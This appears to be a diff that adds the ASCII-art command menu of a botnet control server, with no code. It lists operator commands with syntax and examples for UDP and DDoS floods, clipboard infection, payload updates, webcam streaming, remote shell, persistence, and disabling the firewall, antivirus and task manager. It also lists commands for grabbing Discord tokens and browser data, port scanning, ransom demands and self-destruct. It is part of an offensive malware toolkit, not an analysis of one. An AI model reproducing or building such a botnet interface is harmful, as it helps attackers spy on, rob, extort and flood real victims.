@@ -1,0 +1,34 @@
+
+                                                ╔═════════════════════╗
+                                                ║       COMMAND       ║
+					╔═════════════════════════════════════╩═════════════════════╩════════════════════════════════════╗
+					║     attack udp <ip> <port> <time> <thread>     ║     attack udp 127.0.0.1 80 60 100            ║
+					║     ddos <ip> <thread> <time>                  ║     ddos cookiesservices.xyz 100 60           ║
+          ║     nitrogen <amount>                          ║     nitrogen 100                              ║
+          ║     infectclipboard <botName> <url>            ║     Admin privileges required                 ║
+          ║     stopinfectclipboard <botName>              ║     Admin privileges required                 ║  
+          ║     updatepayload <botName> <url>              ║     Admin privileges required                 ║
+          ║     webcam <botName> <ip> <port>               ║     Stream webcam footage                     ║
+          ║     kill <botName>                             ║     Stop client from listening                ║
+          ║     shell <botName> <cmd>                      ║     Run shell commands                        ║
+          ║     persistence <botName>                      ║     Set persistence                           ║
+          ║     disablefirewall <botName>                  ║     Disable firewall                          ║
+          ║     disableantivirus <botName>                 ║     Disable antivirus                         ║
+          ║     disabletaskmanager <botName>               ║     Disable taskmanager                       ║
+          ║     tokens <botName>                           ║     Grab all stored discord tokens            ║
+          ║     selfdestruct <botName>                     ║     Remove all traces of the BotNet           ║
+          ║     pscan <botName> <ip> <ps> <pe> <thread>    ║     pscan bot 127.0.0.1 1 100 100             ║
+          ║     ransom <botName> <price> <email> <btc>     ║     ransom $100 mail@mail.com BTC             ║
+          ╚════════════════════════════════════════════════════════════════════════════════════════════════╝
+          
+          
+          ╔═══════════════════════════════════════════════════════╗
+          ║     ping                ║     Ping all bots           ║
+          ║     sysinfo             ║     Grab system info        ║
+          ║     list                ║     List online bots        ║
+          ║     update              ║     Update client list      ║
+          ║     datagrabber         ║     Grab all browser info   ║
+          ║     admincheck          ║     Check admin privileges  ║
+          ║     exit or quit        ║     Exit server             ║
+					╚═══════════════════════════════════════════════════════╝
+		
